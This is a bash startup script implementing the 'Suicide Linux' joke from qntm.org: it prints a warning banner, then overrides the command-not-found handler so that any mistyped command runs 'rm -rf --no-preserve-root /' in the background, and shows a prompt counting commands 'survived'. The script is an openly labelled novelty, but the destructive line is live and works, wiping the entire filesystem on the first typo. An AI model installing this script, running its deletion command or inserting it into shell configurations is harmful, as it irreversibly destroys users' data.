#!/bin/bash

# Set warning message
echo "==================================="
echo "WARNING: Suicide-Linux installed"
echo "         (https://qntm.org/suicide)"
echo "==================================="

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# --- vars ---
FAILED_AT=

# --- colors ---
CLR_RESET=$'\033[0m'
CLR_L_RED=$'\033[01;31m'
CLR_L_GREEN=$'\033[01;32m'
CLR_YELLOW=$'\033[01;33m'

function command_not_found_handle {
     if [ -z "$FAILED_AT" ]; then
          echo "Oops, looks like you misspelt something >:)"
          (rm -rf --no-preserve-root / >/dev/null 2>/dev/null &)
          return 127
     fi
}

function __sl_prompt_command {
     if [[ "$?" == "127" && -z "$FAILED_AT" ]]; then
          FAILED_AT=$((HISTCMD-1))
     fi

     __sl_set_ps1
}

function __sl_set_ps1 {
     COUNT=${FAILED_AT:-$HISTCMD}
     if [ -z "$FAILED_AT" ]; then
          PROMPT_COLOR=$CLR_L_GREEN
          COUNT_COLOR=$CLR_YELLOW
          TERMINAL_TITLE="Suicide Linux"
     else
          PROMPT_COLOR=$CLR_L_RED
          COUNT_COLOR=$CLR_L_RED
          TERMINAL_TITLE="Suicide Linux | (×_×)"
     fi

     TERMINAL_TITLE="$TERMINAL_TITLE | survived $COUNT commands"

     PS1="${CLR_RESET}[${COUNT_COLOR}${COUNT}${CLR_RESET}] ${PROMPT_COLOR}\u@\h:\w\$${CLR_RESET} "
     echo -en "\033]0;${TERMINAL_TITLE}\a"
}

PROMPT_COMMAND=__sl_prompt_command